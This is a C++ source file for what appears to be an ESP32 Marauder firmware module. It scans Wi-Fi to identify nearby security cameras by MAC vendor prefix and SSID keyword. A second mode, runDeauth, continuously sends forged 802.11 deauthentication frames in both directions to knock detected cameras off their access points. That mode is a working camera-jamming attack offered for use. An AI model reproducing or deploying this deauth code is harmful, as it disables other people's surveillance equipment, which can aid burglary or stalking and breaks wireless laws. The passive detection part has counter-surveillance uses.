#include "CameraScan.h"
#include "configs.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <ctype.h>
#include <string.h>
#include "Display.h"
#if defined(HAS_BUTTONS)
  #include "Switches.h"
  // only the globals the sketch actually defines (same guards as esp32_marauder.ino)
  #if (C_BTN >= 0)
    extern Switches c_btn;   // center / select
  #endif
  #if (L_BTN >= 0)
    extern Switches l_btn;   // left (acts as back on most nav builds)
  #endif
  #if defined(MARAUDER_POOM) && (B_BTN >= 0)
    extern Switches b_btn;   // dedicated back (POOM)
  #endif
#endif

extern Display display_obj;
CameraScan camera_scan;

#define CAM_TFT_W TFT_WIDTH
#define CAM_TFT_H TFT_HEIGHT

static uint8_t cam_cur_ch = 1;          // channel currently dwelled on
static volatile bool cam_activity = false; // a camera frame was seen on this channel

// ─────────────────────────── Vendor OUI table ───────────────────────────
// First 3 MAC bytes -> brand. Public IEEE seed; extend freely (PRs welcome).
struct CamOui { uint8_t o[3]; const char* brand; };
static const CamOui CAM_OUIS[] = {
  // Hikvision (also Ezviz / many OEM/Annke/LaView)
  {{0x18,0x68,0xCB},"Hikvision"},{{0x28,0x57,0xBE},"Hikvision"},{{0x44,0x19,0xB6},"Hikvision"},
  {{0x4C,0xBD,0x8F},"Hikvision"},{{0x54,0xC4,0x15},"Hikvision"},{{0x64,0xDB,0x8B},"Hikvision"},
  {{0x94,0xE1,0xAC},"Hikvision"},{{0xA4,0x14,0x37},"Hikvision"},{{0xB4,0xA3,0x82},"Hikvision"},
  {{0xBC,0xAD,0x28},"Hikvision"},{{0xC0,0x56,0xE3},"Hikvision"},{{0xC4,0x2F,0x90},"Hikvision"},
  {{0x1C,0xB1,0xC9},"Hikvision"},{{0x58,0x50,0xE6},"Hikvision"},{{0xE0,0xCA,0x3C},"Hikvision"},
  // Dahua (also Lorex / Amcrest / Honeywell OEM)
  {{0x3C,0xEF,0x8C},"Dahua"},{{0x90,0x02,0xA9},"Dahua"},{{0xE0,0x50,0x8B},"Dahua"},
  {{0x14,0xA7,0x8B},"Dahua"},{{0x08,0xED,0xED},"Dahua"},{{0x4C,0x11,0xBF},"Dahua"},
  {{0x24,0x52,0x6A},"Dahua"},{{0x38,0xAF,0x29},"Dahua"},{{0x6C,0x1C,0x71},"Dahua"},
  {{0xA0,0xBD,0x1D},"Dahua"},{{0xBC,0x32,0x5F},"Dahua"},{{0xFC,0x5F,0x49},"Dahua"},
  // Reolink
  {{0xEC,0x71,0xDB},"Reolink"},{{0xB0,0x8B,0xCF},"Reolink"},
  // Amcrest
  {{0x9C,0x8E,0xCD},"Amcrest"},{{0xC0,0x3E,0x0F},"Amcrest"},
  // Wyze
  {{0x2C,0xAA,0x8E},"Wyze"},{{0x7C,0x78,0xB2},"Wyze"},{{0xA4,0xDA,0x22},"Wyze"},{{0xD0,0x3F,0x27},"Wyze"},
  // Axis
  {{0x00,0x40,0x8C},"Axis"},{{0xAC,0xCC,0x8E},"Axis"},{{0xB8,0xA4,0x4F},"Axis"},{{0xE8,0x27,0x25},"Axis"},
  // Ubiquiti (UniFi Protect)
  {{0x04,0x18,0xD6},"Ubiquiti"},{{0x24,0x5A,0x4C},"Ubiquiti"},{{0x44,0xD9,0xE7},"Ubiquiti"},
  {{0x78,0x8A,0x20},"Ubiquiti"},{{0xB4,0xFB,0xE4},"Ubiquiti"},{{0xDC,0x9F,0xDB},"Ubiquiti"},
  {{0xE0,0x63,0xDA},"Ubiquiti"},{{0xF0,0x9F,0xC2},"Ubiquiti"},{{0xFC,0xEC,0xDA},"Ubiquiti"},
  // TP-Link (Tapo / Vigi)
  {{0x50,0xC7,0xBF},"TP-Link"},{{0x1C,0x61,0xB4},"TP-Link"},{{0x3C,0x52,0xA1},"TP-Link"},
  {{0x98,0xDA,0xC4},"TP-Link"},{{0xAC,0x84,0xC6},"TP-Link"},{{0xB0,0x48,0x7A},"TP-Link"},
  {{0xC0,0x06,0xC3},"TP-Link"},{{0xEC,0x08,0x6B},"TP-Link"},
  // D-Link
  {{0xB0,0xC5,0x54},"D-Link"},{{0x1C,0xBD,0xB9},"D-Link"},{{0x28,0x10,0x7B},"D-Link"},
  {{0x78,0x54,0x2E},"D-Link"},{{0x90,0x94,0xE4},"D-Link"},{{0xC8,0xBE,0x19},"D-Link"},{{0xCC,0xB2,0x55},"D-Link"},
  // Foscam
  {{0x00,0x62,0x6E},"Foscam"},{{0x58,0xEF,0x68},"Foscam"},
  // Vivotek
  {{0x00,0x02,0xD1},"Vivotek"},
  // Uniview (UNV)
  {{0x48,0xEA,0x63},"Uniview"},
  // Mobotix
  {{0x00,0x03,0xC5},"Mobotix"},
  // Bosch
  {{0x00,0x07,0x5F},"Bosch"},{{0x00,0x1C,0x44},"Bosch"},{{0x18,0x5B,0xB8},"Bosch"},
  // Panasonic / i-PRO
  {{0x00,0x80,0x45},"Panasonic"},{{0x08,0x00,0x23},"Panasonic"},
  // Netgear / Arlo
  {{0x00,0x0F,0xB5},"Arlo"},{{0x28,0xC6,0x8E},"Arlo"},{{0x44,0x94,0xFC},"Arlo"},
  {{0xA0,0x40,0xA0},"Arlo"},{{0xB0,0x7F,0xB9},"Arlo"},{{0xC0,0x3F,0x0E},"Arlo"},
  // Amazon / Ring / Blink
  {{0x0C,0x47,0xC9},"Ring"},{{0x34,0xD2,0x70},"Ring"},{{0x44,0x00,0x49},"Ring"},
  {{0x68,0x37,0xE9},"Ring"},{{0x74,0x75,0x48},"Ring"},{{0xAC,0x63,0xBE},"Ring"},
  {{0xF0,0x81,0x73},"Ring"},{{0xFC,0x65,0xDE},"Ring"},
  // Google Nest
  {{0x18,0xB4,0x30},"Nest"},{{0x64,0x16,0x66},"Nest"},{{0x6C,0xAD,0xF8},"Nest"},
  {{0x30,0xFD,0x38},"Nest"},{{0xA4,0x77,0x33},"Nest"},{{0xF4,0xF5,0xD8},"Nest"},{{0xF4,0xF5,0xE8},"Nest"},
  // Xiaomi / IMILAB / Aqara cams
  {{0x04,0xCF,0x8C},"Xiaomi"},{{0x28,0x6C,0x07},"Xiaomi"},{{0x50,0x8F,0x4C},"Xiaomi"},
  {{0x64,0x09,0x80},"Xiaomi"},{{0x78,0x11,0xDC},"Xiaomi"},{{0x8C,0xBE,0xBE},"Xiaomi"},{{0xF0,0xB4,0x29},"Xiaomi"},
  // Tuya / LSC / Smart Life (Shenzhen OEM cams)
  {{0xCC,0xB8,0x5E},"Tuya/LSC"},{{0x68,0x57,0x2D},"Tuya/LSC"},{{0xD4,0xA6,0x51},"Tuya/LSC"},
  {{0x50,0x02,0x91},"Tuya/LSC"},{{0x84,0xE3,0x42},"Tuya/LSC"},{{0xD8,0x1F,0x12},"Tuya/LSC"},
};
static const int CAM_OUI_N = sizeof(CAM_OUIS) / sizeof(CAM_OUIS[0]);

// SSID keywords (cameras in AP/setup mode, or with a talking SSID)
struct CamKw { const char* kw; const char* brand; };
static const CamKw CAM_KW[] = {
  {"wyze","Wyze"},{"reolink","Reolink"},{"arlo","Arlo"},{"blink","Blink"},{"ring","Ring"},
  {"hikvision","Hikvision"},{"dahua","Dahua"},{"amcrest","Amcrest"},{"foscam","Foscam"},
  {"lorex","Lorex"},{"eufy","Eufy"},{"ipcam","IP-Cam"},{"ipcamera","IP-Cam"},{"tapo","Tapo"},
  {"vigi","TP-Link"},{"nestcam","Nest"},{"lsc","Tuya/LSC"},{"tuya","Tuya/LSC"},
  {"smartlife","Tuya/LSC"},{"ezviz","Ezviz"},{"annke","Annke"},{"uniview","Uniview"},
  {"vivotek","Vivotek"},{"mobotix","Mobotix"},{"sricam","Sricam"},{"yicam","Yi"},{"imou","Imou"},
  {"camera","Camera"},{"webcam","Camera"},{"cam-","Camera"},{"doorbell","Doorbell"},
};
static const int CAM_KW_N = sizeof(CAM_KW) / sizeof(CAM_KW[0]);

static const char* camByOui(const uint8_t* m) {
  for (int i = 0; i < CAM_OUI_N; i++)
    if (m[0]==CAM_OUIS[i].o[0] && m[1]==CAM_OUIS[i].o[1] && m[2]==CAM_OUIS[i].o[2])
      return CAM_OUIS[i].brand;
  return NULL;
}
static const char* camBySsid(const uint8_t* s, int len) {
  if (len <= 0 || len > 32) return NULL;
  char low[33]; int i = 0;
  while (i < len && i < 32) { low[i] = (char)tolower(s[i]); i++; }
  low[i] = 0;
  for (int k = 0; k < CAM_KW_N; k++) if (strstr(low, CAM_KW[k].kw)) return CAM_KW[k].brand;
  return NULL;
}

// ─────────────────────────── Detected list ───────────────────────────
#define CAM_MAX 16
struct Cam { uint8_t mac[6]; char brand[12]; int8_t rssi; uint16_t hits;
             uint8_t ap[6]; uint8_t ch; bool haveAp; };
static Cam c_list[CAM_MAX];
static int c_count = 0;

static void addCam(const uint8_t* mac, int8_t rssi, const char* brand, const uint8_t* ap, uint8_t ch) {
  cam_activity = true;
  for (int i = 0; i < c_count; i++) {
    if (memcmp(c_list[i].mac, mac, 6) == 0) {
      c_list[i].rssi = rssi; c_list[i].hits++;
      if (ap && !c_list[i].haveAp) { memcpy(c_list[i].ap, ap, 6); c_list[i].ch = ch; c_list[i].haveAp = true; }
      return;
    }
  }
  if (c_count >= CAM_MAX) return;
  Cam& c = c_list[c_count++];
  memcpy(c.mac, mac, 6);
  strncpy(c.brand, brand, sizeof(c.brand)-1); c.brand[sizeof(c.brand)-1]=0;
  c.rssi = rssi; c.hits = 1; c.haveAp = false;
  if (ap) { memcpy(c.ap, ap, 6); c.ch = ch; c.haveAp = true; }
  Serial.printf("[CAM] %s %02X:%02X:%02X:%02X:%02X:%02X rssi=%d ap=%d\n", brand,
    mac[0],mac[1],mac[2],mac[3],mac[4],mac[5], rssi, (int)(ap != NULL));
}

static void cam_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* fr = p->payload;
  int len = p->rx_ctrl.sig_len;
  if (len < 16) return;
  const uint8_t* mac = &fr[10];                 // addr2 = transmitter
  const char* brand = camByOui(mac);
  if (!brand && type == WIFI_PKT_MGMT) {        // SSID heuristic on beacon/probe
    uint8_t sub = (fr[0] >> 4) & 0xF;
    if (sub == 8 || sub == 5 || sub == 4) {
      int ie = (sub == 4) ? 24 : 36;
      if (ie + 2 <= len && fr[ie] == 0) {
        int sl = fr[ie+1];
        if (sl > 0 && ie + 2 + sl <= len) brand = camBySsid(&fr[ie+2], sl);
      }
    }
  }
  if (brand) {
    const uint8_t* ap = NULL;
    if (type == WIFI_PKT_DATA && (fr[1] & 0x01)) ap = &fr[4];  // to-DS: addr1 = BSSID (AP)
    addCam(mac, p->rx_ctrl.rssi, brand, ap, cam_cur_ch);
  }
}

// ─────────────────────────── Input (auto touch/buttons) ───────────────────────────
static bool exitPressed() {
#if defined(HAS_TOUCH)
  { uint16_t x = 0, y = 0; if (display_obj.updateTouch(&x, &y)) return true; }
#endif
#if defined(HAS_BUTTONS)
  #if (C_BTN >= 0)
    if (c_btn.justPressed()) return true;
  #endif
  #if (L_BTN >= 0)
    if (l_btn.justPressed()) return true;
  #endif
  #if defined(MARAUDER_POOM) && (B_BTN >= 0)
    if (b_btn.justPressed()) return true;
  #endif
#endif
  return false;
}
// non-blocking wait that still polls input; returns true if exit was requested
static bool dwell(uint32_t ms) {
  uint32_t t0 = millis();
  while (millis() - t0 < ms) {
    if (exitPressed()) return true;
    delay(8);
  }
  return false;
}

// ─────────────────────────── Weighted 2.4 GHz sweep ───────────────────────────
// Hits 1/6/11 (where cameras usually live) on nearly every step so a camera is
// found within ~1-2 s there; the other channels are covered once per pass.
static const uint8_t SWEEP[] = {
  1,6,11, 2, 1,6,11, 3, 1,6,11, 4, 1,6,11, 5, 1,6,11, 7,
  1,6,11, 8, 1,6,11, 9, 1,6,11, 10, 1,6,11, 12, 1,6,11, 13
};
static const int SWEEP_N = sizeof(SWEEP) / sizeof(SWEEP[0]);

static int countWithAp() { int n = 0; for (int k = 0; k < c_count; k++) if (c_list[k].haveAp) n++; return n; }

// ─────────────────────────── Self-contained deauth TX ───────────────────────────
static uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0,0,0,0,0,0,       // addr1 = destination
  0,0,0,0,0,0,       // addr2 = source
  0,0,0,0,0,0,       // addr3 = BSSID
  0x00, 0x00,        // seq
  0x07, 0x00         // reason: class-3 frame from nonassociated STA
};
static void txDeauth(const uint8_t* ap, const uint8_t* cam, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  // AP -> camera (kick the client off)
  memcpy(deauthFrame + 4,  cam, 6);
  memcpy(deauthFrame + 10, ap,  6);
  memcpy(deauthFrame + 16, ap,  6);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
  // camera -> AP (the other direction, for good measure)
  memcpy(deauthFrame + 4,  ap,  6);
  memcpy(deauthFrame + 10, cam, 6);
  memcpy(deauthFrame + 16, ap,  6);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

// ─────────────────────────── Shared sniffer setup / UI ───────────────────────────
static void startSniffer() {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&cam_cb);
  esp_wifi_set_promiscuous(true);
}
static void stopSniffer() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

static void drawList(bool withApCol) {
  display_obj.tft.fillRect(0, 44, CAM_TFT_W, CAM_TFT_H - 44, TFT_BLACK);
  display_obj.tft.setCursor(0, 44);
  display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (withApCol) display_obj.tft.printf("Cameras: %d  (with AP: %d)\n", c_count, countWithAp());
  else           display_obj.tft.printf("Cameras found: %d\n", c_count);
  for (int k = 0; k < c_count && k < 6; k++) {
    Cam& c = c_list[k];
    display_obj.tft.setTextColor(c.haveAp ? TFT_ORANGE : TFT_RED, TFT_BLACK);
    display_obj.tft.printf("%-9s %ddBm %s\n", c.brand, c.rssi, c.haveAp ? "[AP]" : "");
    int w = (c.rssi + 90) * CAM_TFT_W / 60;            // -90dBm empty .. -30dBm full
    if (w < 0) w = 0; if (w > CAM_TFT_W) w = CAM_TFT_W;
    int y = display_obj.tft.getCursorY();
    display_obj.tft.fillRect(0, y, w, 5, TFT_GREEN);
    display_obj.tft.fillRect(w, y, CAM_TFT_W - w, 5, 0x2104);
    display_obj.tft.setCursor(0, y + 8);
    display_obj.tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    display_obj.tft.printf(" %02X:%02X:%02X:%02X:%02X:%02X\n",
      c.mac[0],c.mac[1],c.mac[2],c.mac[3],c.mac[4],c.mac[5]);
  }
  if (c_count == 0) {
    display_obj.tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    display_obj.tft.println("no known camera yet...");
  }
}

static void header(const char* title, uint16_t col, const char* l1, const char* l2) {
  display_obj.tft.fillScreen(TFT_BLACK);
  display_obj.tft.setCursor(0, 0);
  display_obj.tft.setTextSize(2);
  display_obj.tft.setTextColor(col, TFT_BLACK);
  display_obj.tft.println(title);
  display_obj.tft.setTextSize(1);
  display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
  if (l1) display_obj.tft.println(l1);
  if (l2) display_obj.tft.println(l2);
}

// one sweep step with adaptive parking; returns true if exit requested
static bool sweepStep(int& si, bool withApCol) {
  cam_cur_ch = SWEEP[si % SWEEP_N]; si++;
  esp_wifi_set_channel(cam_cur_ch, WIFI_SECOND_CHAN_NONE);
  cam_activity = false;
  bool prime = (cam_cur_ch == 1 || cam_cur_ch == 6 || cam_cur_ch == 11);
  if (dwell(prime ? 280 : 200)) return true;
  // adaptive park: saw a camera here but still missing its AP -> linger for its data frame
  if (cam_activity && countWithAp() < c_count) { if (dwell(320)) return true; }
  drawList(withApCol);
  return false;
}

// ─────────────────────────── Passive scan ───────────────────────────
void CameraScan::run() {
  c_count = 0;
  header("Camera Scan", TFT_CYAN, "Wi-Fi cameras (passive)...",
         "RSSI high = closer.  Exit to quit");
  delay(600);
  startSniffer();
  int si = 0;
  while (!sweepStep(si, false)) { /* loop until exit */ }
  stopSniffer();
  WiFi.mode(WIFI_STA);
}

// ─────────────────────────── Detect + deauth ───────────────────────────
void CameraScan::runDeauth() {
  c_count = 0;
  header("Camera Deauth", TFT_RED, "1) finding cameras...",
         "Exit when they show [AP]");
  delay(600);
  startSniffer();
  int si = 0;
  while (!sweepStep(si, true)) { /* loop until exit */ }
  stopSniffer();

  // wait for the exit press to be released so it doesn't close phase 2 instantly
  delay(250);
  while (true) {
    bool held = false;
#if defined(HAS_TOUCH)
    { uint16_t x=0,y=0; if (display_obj.updateTouch(&x,&y)) held = true; }
#endif
#if defined(HAS_BUTTONS)
  #if (C_BTN >= 0)
    if (c_btn.isPressedNow()) held = true;
  #endif
  #if (L_BTN >= 0)
    if (l_btn.isPressedNow()) held = true;
  #endif
  #if defined(MARAUDER_POOM) && (B_BTN >= 0)
    if (b_btn.isPressedNow()) held = true;
  #endif
#endif
    if (!held) break;
    delay(20);
  }
  delay(200);

  int nd = countWithAp();
  if (nd == 0) {
    header("Camera Deauth", TFT_RED, "No camera with a known AP.",
           "(needs camera data traffic)");
    display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
    display_obj.tft.println(">> Exit to quit <<");
    delay(400);
    while (!exitPressed()) delay(60);
    WiFi.mode(WIFI_STA);
    return;
  }

  header("Camera Deauth", TFT_RED, "Kicking cameras off their AP", "(exit to stop)");
  display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
  display_obj.tft.printf("targets: %d\n", nd);
  esp_wifi_set_promiscuous(true);   // needed so esp_wifi_set_channel() works for TX
  uint32_t cycles = 0;
  while (!exitPressed()) {
    for (int k = 0; k < c_count; k++)
      if (c_list[k].haveAp)
        txDeauth(c_list[k].ap, c_list[k].mac, c_list[k].ch);
    delay(2);
    cycles++;
    display_obj.tft.fillRect(0, 76, CAM_TFT_W, 12, TFT_BLACK);
    display_obj.tft.setCursor(0, 76);
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.tft.printf("cycles: %lu  targets: %d", (unsigned long)cycles, nd);
  }
  WiFi.mode(WIFI_STA);
}
